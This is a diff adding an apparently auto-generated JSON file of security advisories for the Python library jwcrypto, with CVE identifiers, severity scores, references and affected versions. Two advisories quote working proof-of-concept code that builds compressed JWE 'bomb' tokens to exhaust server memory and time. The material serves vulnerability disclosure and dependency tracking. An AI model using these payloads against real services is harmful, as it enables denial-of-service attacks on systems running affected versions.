@@ -1,0 +1,651 @@
+{
+  "schema_version": 1,
+  "package": "jwcrypto",
+  "purls": [
+    "pkg:pypi/jwcrypto"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 15,
+  "advisories": [
+    {
+      "id": "GHSA-cw2r-4p82-qv79",
+      "primary_id": "CVE-2023-6681",
+      "aliases": [
+        "CVE-2023-6681",
+        "PYSEC-2024-104"
+      ],
+      "cve_ids": [
+        "CVE-2023-6681"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": "DoS with algorithms that use PBKDF2 due to unbounded PBES2 Count value",
+      "details": "### Impact\nDenial of Service,\nApplications that allow the use of the PBKDF2 algorithm.\n\n### Patches\nA [patch](https://github.com/latchset/jwcrypto/commit/d2655d370586cb830e49acfb450f87598da60be8) is available that sets the maximum number of default rounds.\n\n### Workarounds\nApplications that do not need to use PBKDF2 should simply specify the algorithms use and exclude it from the list.\nApplications that need to use the algorithm should upgrade to the new version that allows to set a maximum rounds number.\n\n### Acknowledgement\nThe issues was reported by Jingcheng Yang and Jianjun Chen from Sichuan University\nand Zhongguancun Lab\n",
+      "published": "2023-12-28T16:36:59Z",
+      "modified": "2024-11-12T19:15:29.552255Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/security/advisories/GHSA-cw2r-4p82-qv79"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6681"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/commit/d2655d370586cb830e49acfb450f87598da60be8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2024:3267"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/errata/RHSA-2024:9281"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2023-6681"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2260843"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/latchset/jwcrypto"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2024-104.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-cw2r-4p82-qv79",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ],
+      "affected_conda_versions": [
+        "0.5.0",
+        "0.6.0",
+        "0.8",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ]
+    },
+    {
+      "id": "GHSA-fjrm-76x2-c4q4",
+      "primary_id": "CVE-2026-39373",
+      "aliases": [
+        "CVE-2026-39373"
+      ],
+      "cve_ids": [
+        "CVE-2026-39373"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": "JWCrypto: JWE ZIP decompression bomb",
+      "details": "### Summary\nThe fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.\n\nAlthough this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.\n\nNOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.\n\nNOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I _intentionally_ left the \"details\" section untouched to show how bad AI slop is and how _uncritical_ the submitter was, even as it was obvious the \"suggested fix\" is actually no solution at all, as it was using the very call that he claimed was causing \"arbitrary\" memory exhaustion and wrapping it around an \"if\" ... the actual solution is in the resolving commit in version 1.5.7\n\n### Details\nThe vulnerable code in `jwcrypto/jwe.py`:\n```python\nif len(data) > default_max_compressed_size:\n    raise InvalidJWEData('Compressed data exceeds maximum allowed size')\nself.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)\n```\n\nThe check validates `data` which is the **compressed** bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.\n\n### PoC\nTested on jwcrypto 1.5.6 (patched version):\n```python\nimport zlib\nfrom jwcrypto import jwe\nfrom jwcrypto.jwk import JWK\nimport time\n\nkey = JWK.generate(kty='oct', size=128)\nbomb_data = b\"A\" * 1024 * 1024 * 100  # 100MB uncompressed\n\ntoken = jwe.JWE(\n    plaintext=bomb_data,\n    protected={\"alg\": \"A128KW\", \"enc\": \"A128GCM\", \"zip\": \"DEF\"}\n)\ntoken.add_recipient(key)\nserialized = token.serialize(compact=True)\nprint(f\"Token size: {len(serialized)/1024:.1f} KB\")  # 132.8 KB \u2014 under 250KB limit\n\ntok2 = jwe.JWE()\ntok2.deserialize(serialized, key)\nprint(f\"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB\")  # 100 MB\n```\n\nOutput:\n```\nToken size: 132.8 KB\nDecompressed: 100 MB\n```\n\n### Impact\nAn unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.",
+      "published": "2026-04-08T00:16:14Z",
+      "modified": "2026-04-20T21:59:13.080970871Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39373"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/latchset/jwcrypto"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-fjrm-76x2-c4q4",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.5.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.5.4",
+        "1.5.5",
+        "1.5.6"
+      ],
+      "affected_conda_versions": [
+        "0.5.0",
+        "0.6.0",
+        "0.8",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.4",
+        "1.5.5",
+        "1.5.6"
+      ]
+    },
+    {
+      "id": "GHSA-gwp4-mcv4-w95j",
+      "primary_id": "CVE-2022-3102",
+      "aliases": [
+        "CVE-2022-3102"
+      ],
+      "cve_ids": [
+        "CVE-2022-3102"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": "jwcrypto token substitution can lead to authentication bypass",
+      "details": "The JWT code can auto-detect the type of token being provided, and this can lead the application to incorrect conclusions about the trustworthiness of the token.\nQuoting the private disclosure we received : \"Under certain circumstances, it is possible to substitute a [..] signed JWS with a JWE that is encrypted with the public key that is normally used for signature validation.\"\nThis substitution attack can occur only if the validating application also have access to the private key, normally used to sign the tokens, available during validation of the received JWT.\nThe significance of this attacks depends on the use of the token, it may lead to authentication bypass or authorization bypass (respectively if claims are used to authenticate or authorize certain actions), because the attacker has full control of the data placed in the JWE and can inject any desired claim value.\n\nSeveral mitigating factors exist that can protect applications from this issue:\n- If the private key corresponding to the public key used to encrypt the JWE is not available to the application an exception will be raised.\n- If the JWK is specified with the 'use' parameter set to 'sig' (as expected for keys used only for signing/verification) an exception will be raised.\n- If the JWK is specified with the 'key_ops' parameter set and it does not include the 'decrypt' operation an exception will be raised.\n- Applications may check the token type before validation, in this case they would fail to detect an expected JWS\n\nNormally, signing and validation are done by different applications, so this scenario should be unlikely. However it is possible to have applications that both sign and validate tokens and do not separate JWKs in use, or do not set a JWK 'use' type.\n\nDue to the mitigating factors, and the fact that specific operational constraints and conditions need to be in place to successfully exploit this issue to generate an authentication bypass, we rate this security issue as moderate. Other avenues may decide on a different rating based on use case, always verify what conditions apply to your use of the library to assess risk.\n\nMany thanks to Tom Tervoort of Secura for finding and reporting this issue.\n",
+      "published": "2022-09-21T16:58:31Z",
+      "modified": "2024-12-02T05:46:27.605404Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/security/advisories/GHSA-gwp4-mcv4-w95j"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/commit/f4e912f83cb578e2cd47f8a9398bf15f680bf558"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/latchset/jwcrypto"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/releases/tag/v1.4.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-gwp4-mcv4-w95j",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1"
+      ],
+      "affected_conda_versions": [
+        "0.5.0",
+        "0.6.0",
+        "0.8",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1"
+      ]
+    },
+    {
+      "id": "GHSA-j857-7rvv-vj97",
+      "primary_id": "CVE-2024-28102",
+      "aliases": [
+        "CVE-2024-28102"
+      ],
+      "cve_ids": [
+        "CVE-2024-28102"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": "JWCrypto vulnerable to JWT bomb Attack in `deserialize` function",
+      "details": "## Affected version\nVendor: https://github.com/latchset/jwcrypto\nVersion: 1.5.5\n\n## Description\nAn attacker can cause a DoS attack by passing in a malicious JWE Token with a high compression ratio.\nWhen the server processes this Token, it will consume a lot of memory and processing time.\n\n## Poc\n```python\nfrom jwcrypto import jwk, jwe\nfrom jwcrypto.common import json_encode, json_decode\nimport time\npublic_key = jwk.JWK()\nprivate_key = jwk.JWK.generate(kty='RSA', size=2048)\npublic_key.import_key(**json_decode(private_key.export_public()))\n\n\npayload = '{\"u\": \"' + \"u\" * 400000000 + '\", \"uu\":\"' + \"u\" * 400000000 + '\"}'\nprotected_header = {\n    \"alg\": \"RSA-OAEP-256\",\n    \"enc\": \"A256CBC-HS512\",\n    \"typ\": \"JWE\",\n    \"zip\": \"DEF\",\n    \"kid\": public_key.thumbprint(),\n}\njwetoken = jwe.JWE(payload.encode('utf-8'),\n                   recipient=public_key,\n                   protected=protected_header)\nenc = jwetoken.serialize(compact=True)\n\nprint(\"-----uncompress-----\")\n\nprint(len(enc))\n\nbegin = time.time()\n\njwetoken = jwe.JWE()\njwetoken.deserialize(enc, key=private_key)\n\nprint(time.time() - begin)\n\nprint(\"-----compress-----\")\n\npayload = '{\"u\": \"' + \"u\" * 400000 + '\", \"uu\":\"' + \"u\" * 400000 + '\"}'\nprotected_header = {\n    \"alg\": \"RSA-OAEP-256\",\n    \"enc\": \"A256CBC-HS512\",\n    \"typ\": \"JWE\",\n    \"kid\": public_key.thumbprint(),\n}\njwetoken = jwe.JWE(payload.encode('utf-8'),\n                   recipient=public_key,\n                   protected=protected_header)\nenc = jwetoken.serialize(compact=True)\n\nprint(len(enc))\n\nbegin = time.time()\n\njwetoken = jwe.JWE()\njwetoken.deserialize(enc, key=private_key)\n\nprint(time.time() - begin)\n```\nIt can be found that when processing Tokens with similar lengths, the processing time of compressed tokens is significantly longer.\n<img width=\"172\" alt=\"image\" src=\"https://github.com/latchset/jwcrypto/assets/133195620/23193327-3cd7-499a-b5aa-28c56af92785\">\n\n\n\n## Mitigation\nTo mitigate this vulnerability, it is recommended to limit the maximum token length to 250K. This approach has also\nbeen adopted by the JWT library System.IdentityModel.Tokens.Jwt used in Microsoft Azure [1], effectively preventing\nattackers from exploiting this vulnerability with high compression ratio tokens.\n\n## References\n[1] [CVE-2024-21319](https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/security/advisories/GHSA-8g9c-28fc-mcx2)",
+      "published": "2024-03-06T20:00:56Z",
+      "modified": "2026-02-04T04:31:53.333787Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/security/advisories/GHSA-j857-7rvv-vj97"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28102"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/commit/90477a3b6e73da69740e00b8161f53fea19b831f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/latchset/jwcrypto"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/09/msg00026.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.vicarius.io/vsociety/posts/denial-of-service-vulnerability-discovered-in-jwcrypto-cve-2024-28102-28103"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-j857-7rvv-vj97",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.5.4",
+        "1.5.5"
+      ],
+      "affected_conda_versions": [
+        "0.5.0",
+        "0.6.0",
+        "0.8",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.4",
+        "1.5.5"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-104",
+      "primary_id": "CVE-2023-6681",
+      "aliases": [
+        "CVE-2023-6681",
+        "GHSA-cw2r-4p82-qv79"
+      ],
+      "cve_ids": [
+        "CVE-2023-6681"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": null,
+      "details": "A vulnerability was found in JWCrypto. This flaw allows an attacker to cause a denial of service (DoS) attack and possible password brute-force and dictionary attacks to be more resource-intensive. This issue can result in a large amount of computational consumption, causing a denial of service attack.",
+      "published": "2024-02-12T14:15:00Z",
+      "modified": "2024-10-10T17:57:34.908615Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2023-6681"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2260843"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://access.redhat.com/errata/RHSA-2024:3267"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-104",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.7",
+        "0.8",
+        "0.9",
+        "0.9.1",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ],
+      "affected_conda_versions": [
+        "0.5.0",
+        "0.6.0",
+        "0.8",
+        "1.0",
+        "1.2",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ]
+    },
+    {
+      "id": "GHSA-wg33-x934-3ghh",
+      "primary_id": "CVE-2016-6298",
+      "aliases": [
+        "CVE-2016-6298",
+        "PYSEC-2016-4"
+      ],
+      "cve_ids": [
+        "CVE-2016-6298"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": "jwcrypto lacks the Random Filling protection mechanism",
+      "details": "The _Rsa15 class in the RSA 1.5 algorithm implementation in jwa.py in jwcrypto before 0.3.2 lacks the Random Filling protection mechanism, which makes it easier for remote attackers to obtain cleartext data via a Million Message Attack (MMA).",
+      "published": "2022-05-17T03:39:31Z",
+      "modified": "2024-11-19T19:32:10.545686Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6298"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/issues/65"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/pull/66"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/commit/eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/latchset/jwcrypto"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/releases/tag/v0.3.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2016-4.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://web.archive.org/web/20200227230613/http://www.securityfocus.com/bid/92729"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wg33-x934-3ghh",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.3.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1"
+      ],
+      "affected_conda_versions": []
+    },
+    {
+      "id": "PYSEC-2016-4",
+      "primary_id": "CVE-2016-6298",
+      "aliases": [
+        "CVE-2016-6298",
+        "GHSA-wg33-x934-3ghh"
+      ],
+      "cve_ids": [
+        "CVE-2016-6298"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "jwcrypto",
+      "summary": null,
+      "details": "The _Rsa15 class in the RSA 1.5 algorithm implementation in jwa.py in jwcrypto before 0.3.2 lacks the Random Filling protection mechanism, which makes it easier for remote attackers to obtain cleartext data via a Million Message Attack (MMA).",
+      "published": "2016-09-01T23:59:00Z",
+      "modified": "2024-04-29T16:41:32.606701Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "FIX",
+          "url": "https://github.com/latchset/jwcrypto/commit/eb5be5bd94c8cae1d7f3ba9801377084d8e5a7ba"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/latchset/jwcrypto/issues/65"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/pull/66"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/latchset/jwcrypto/releases/tag/v0.3.2"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.securityfocus.com/bid/92729"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2016-4",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.4.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.3.1"
+      ],
+      "affected_conda_versions": []
+    }
+  ]
+}
